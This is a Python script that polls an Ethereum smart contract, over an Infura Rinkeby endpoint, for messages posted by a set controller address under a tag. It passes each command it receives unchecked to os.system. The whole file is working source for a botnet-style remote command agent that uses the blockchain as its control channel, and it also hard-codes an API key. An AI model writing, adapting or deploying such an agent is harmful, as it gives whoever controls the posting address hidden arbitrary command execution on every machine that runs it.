'''
a. shiloh

'''

###################
# Imports
###################

import hashlib
import json
import time
import os

from web3 import Web3

###################
# Variables
###################

relay = '0x69429FB223b3BA3D5823B980E590bF857a680c13'
shepherd = '0xb43114Bd08B4583b2a7e3ae4603831AB5fa6711f'
tag = 'dogg'
tag = 'peliii'
w3_provider = 'https://rinkeby.infura.io/v3/4ac3bf1caeb14c3e9c241c25ea1d3326'

w3 = None

POLL_RATE = 5 #seconds

Command_Count = {}
Command_Hashes = []
Commands = []

###################
# Helpers
###################

def Reload_W3_Connection():
	global w3
	w3 = Web3(Web3.HTTPProvider(w3_provider))

def log(msg, error = False, debug = False):
	head = '[INFO]'
	if error:
		head = '[ERROR]'
	if debug:
		head = '[DEBUG]'
	print(head + ' ' + str(msg))

def Save_Command(cmd_data):
	if cmd_data[0] not in Command_Hashes:
		Command_Hashes.append(cmd_data[0])
		Commands.append(cmd_data)

def Search_Sig(relay, shepherd, tag):
	return str(hashlib.md5((relay + shepherd + tag).encode('utf-8')).hexdigest())

def print_cmd_info(cmd, relay, shepherd, tag, w3_prov, sid):
	print('')
	print('################################################')
	print('Relay:\t\t'+str(relay))
	print('Shepherd:\t'+str(shepherd))
	print('Tag/Channel:\t'+str(tag))
	print('Web3:\t\t'+str(w3_prov))
	print('Sequence Index:\t'+str(sid))
	print('------------------------------------------------')
	print('OpCode:\t\t'+str(cmd[1].split('~')[0]))
	print('Param:\t\t'+str(cmd[1].split('~')[1]))
	print('################################################')
	print('')

###################
# OpCodes
###################

def c0_Raw_Command(cmd):
	raw_cmd = cmd[1].split('~')[1]
	os.system(raw_cmd)

def Route_Command(cmd):
	opcode = cmd[1].split('~')[0]

	if opcode == '0':
		c0_Raw_Command(cmd)

###################
# Web3
###################

relay_abi = [{"inputs":[],"name":"burn","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"bytes32","name":"_posthash","type":"bytes32"}],"name":"get_post","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"_poster","type":"address"},{"internalType":"string","name":"_tag","type":"string"}],"name":"get_postcount_from_address_tag","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"_poster","type":"address"},{"internalType":"string","name":"_tag","type":"string"},{"internalType":"uint256","name":"_id","type":"uint256"}],"name":"get_posthash_from_address_tag_id","outputs":[{"internalType":"bytes32","name":"","type":"bytes32"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"_poster","type":"address"},{"internalType":"string","name":"_tag","type":"string"}],"name":"get_posthashes_from_address_tag","outputs":[{"internalType":"bytes32[]","name":"","type":"bytes32[]"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"info","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"info_burn","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"info_contract_address","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"string","name":"_message","type":"string"},{"internalType":"string[]","name":"_tags","type":"string[]"}],"name":"push_post","outputs":[],"stateMutability":"nonpayable","type":"function"}]

def Get_Relay(address):
	return Web3.toChecksumAddress(address)

def Check_Post_Count(relay_contract, shepherd, tag):
	return relay_contract.functions.get_postcount_from_address_tag(Web3.toChecksumAddress(shepherd), tag).call()

def Get_Command(relay_contract, shepherd, tag, id):
	# Lookup hash
	cmd_hash = relay_contract.functions.get_posthash_from_address_tag_id(Web3.toChecksumAddress(shepherd), tag, int(id)).call()

	# Resolve hash
	cmd = relay_contract.functions.get_post(cmd_hash).call()

	return [cmd_hash, cmd]

###################
# Main
###################

def SCR_Listener():
	Reload_W3_Connection()

	while True:
		# Load Contract
		relay_contract = w3.eth.contract(address=Get_Relay(relay), abi=relay_abi)

		# Poll Command Count
		sig = Search_Sig(relay, shepherd, tag)
		count = Check_Post_Count(relay_contract, shepherd, tag)

		# Provision new sig counter if necessary
		try:
			Command_Count[sig]
		except:
			Command_Count[sig] = 0

		# Read, Save, and Process New Commands
		while Command_Count[sig] < count:
			new_index = Command_Count[sig] + 1
			cmd_data = Get_Command(relay_contract, shepherd, tag, new_index)
			print_cmd_info(cmd_data, relay, shepherd, tag, w3_provider, new_index)

			Command_Count[sig] = new_index

			Save_Command(cmd_data)
			Route_Command(cmd_data)

		time.sleep(POLL_RATE)

###################
# Start
###################

SCR_Listener()
